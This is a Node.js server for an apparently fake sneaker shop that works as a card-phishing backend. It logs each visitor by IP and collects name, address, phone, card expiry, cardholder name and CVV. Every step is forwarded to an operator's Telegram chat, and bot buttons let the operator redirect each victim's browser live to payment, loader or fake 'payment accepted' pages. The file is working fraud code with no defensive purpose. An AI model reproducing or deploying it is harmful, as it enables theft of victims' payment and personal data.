import express from 'express';
import path from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'public')));

// Variables Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');

// Sessions par IP
const sessions = {}; // ip -> {data:{page, pair, delivery, card}, redirect:null}

// -------------------- Helper --------------------
async function sendTelegramNotif(data, actionText='Nouvelle interaction') {
  if(!TELEGRAM_API || !CHAT_ID) return;
  const lines = [`🆕 <b>${actionText}</b>`];
  if(data.ip) lines.push('🌐 <b>IP:</b> '+data.ip);
  if(data.page) lines.push('📄 <b>Page:</b> '+data.page);
  if(data.pair) lines.push('👟 <b>Paire choisie:</b> '+data.pair);
  if(data.delivery){
    lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
    lines.push(`📞 <b>Tel:</b> ${data.delivery.telephone}`);
  }
  if(data.card){
    lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);
    lines.push(`📝 <b>Nom titulaire:</b> ${data.card.nomTitulaire}`);
    lines.push(`📅 <b>Expiry:</b> ${data.card.expiry}`);
    lines.push(`🔒 <b>CVV:</b> ${data.card.cvv}`);
  }

  const text = lines.join('\n');

  const keyboard = {
    inline_keyboard:[
      [{text:'➡️ Accueil', callback_data:'redirect|'+data.ip+'|/'}],
      [{text:'👟 Produit', callback_data:'redirect|'+data.ip+'|/product.html'}],
      [{text:'📦 Livraison', callback_data:'redirect|'+data.ip+'|/delivery.html'}],
      [{text:'💳 Paiement', callback_data:'redirect|'+data.ip+'|/payment.html'}],
      [{text:'⏳ Loader', callback_data:'redirect|'+data.ip+'|/loader.html'}],
      [{text:'✅ Paiement Accepté', callback_data:'redirect|'+data.ip+'|/accepted.html'}]
    ]
  };

  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode:'HTML',
        reply_markup: keyboard
      })
    });
  } catch(err){
    console.error('Erreur Telegram:', err);
  }
}

// -------------------- Utilitaires --------------------
function getIP(req){
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if(ip.includes(',')) ip = ip.split(',')[0];
  if(ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
  return ip;
}

// -------------------- Endpoints --------------------

// Nouvelle visite sur index.html
app.post('/api/visit', (req,res)=>{
  const ip = getIP(req);
  const isNewVisitor = !sessions[ip];
  sessions[ip] = sessions[ip] || {data:{page:'Accueil', ip}, redirect:null};
  if(isNewVisitor) sendTelegramNotif(sessions[ip].data, 'Nouveau visiteur');
  res.json({ok:true, ip});
});

// Interaction clic "Voir produit"
app.post('/api/interaction', (req,res)=>{
  const ip = getIP(req);
  const {action} = req.body; // ex: "Interaction vers page produit"
  if(!sessions[ip]) sessions[ip] = {data:{page:'Accueil', ip}, redirect:null};
  sessions[ip].data.page = 'Produit';
  sendTelegramNotif(sessions[ip].data, action);
  res.json({ok:true});
});

// Choix paire
app.post('/api/pair', (req,res)=>{
  const {pair} = req.body;
  const ip = getIP(req);
  if(!sessions[ip]) sessions[ip]={data:{page:'Produit', ip}, redirect:null};
  sessions[ip].data.pair = pair;
  sessions[ip].data.page = 'Produit';
  sendTelegramNotif(sessions[ip].data, 'Paire choisie');
  res.json({ok:true});
});

// Livraison
app.post('/api/delivery', (req,res)=>{
  const {nom, prenom, adresse, telephone} = req.body;
  const ip = getIP(req);
  if(!sessions[ip]) sessions[ip]={data:{page:'Livraison', ip}, redirect:null};
  sessions[ip].data.delivery = {nom, prenom, adresse, telephone};
  sessions[ip].data.page = 'Livraison';
  sendTelegramNotif(sessions[ip].data, 'Info Livraison');
  res.json({ok:true});
});

// Paiement
app.post('/api/payment', (req,res)=>{
  const {cardNumber, expiry, cvv, nomTitulaire} = req.body;
  const ip = getIP(req);
  if(!sessions[ip]) sessions[ip]={data:{page:'Paiement', ip}, redirect:null};
  sessions[ip].data.card = {
    panMasked:'**** **** **** '+(cardNumber?cardNumber.slice(-4):'0000'),
    expiry, cvv, nomTitulaire
  };
  sessions[ip].data.page = 'Paiement';
  sendTelegramNotif(sessions[ip].data, 'Paiement en attente');
  res.json({ok:true});
});

// Polling status loader/redirection bot
app.get('/api/status', (req,res)=>{
  const ip = getIP(req);
  res.json({redirect:sessions[ip]?.redirect || null});
});

// Telegram webhook
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body?.callback_query){
    const cb = body.callback_query;
    const [action, ip, url] = (cb.data||'').split('|');
    if(action==='redirect' && sessions[ip]){
      sessions[ip].redirect = url;
      sessions[ip].data.page = 'Redirection Bot vers '+url;
      sendTelegramNotif(sessions[ip].data, 'Redirection Bot');
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({callback_query_id:cb.id, text:'Redirection envoyée.'})
      });
    } else {
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({callback_query_id:cb.id, text:'Session introuvable.'})
      });
    }
  }
  res.sendStatus(200);
});

// -------------------- Pages Frontend --------------------
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
app.get('/product.html', (req,res)=>res.sendFile(path.join(__dirname,'public','product.html')));
app.get('/delivery.html', (req,res)=>res.sendFile(path.join(__dirname,'public','delivery.html')));
app.get('/payment.html', (req,res)=>res.sendFile(path.join(__dirname,'public','payment.html')));
app.get('/loader.html', (req,res)=>res.sendFile(path.join(__dirname,'public','loader.html')));
app.get('/accepted.html', (req,res)=>res.sendFile(path.join(__dirname,'public','accepted.html')));

// -------------------- Lancer serveur --------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log('✅ Server listening on', PORT));
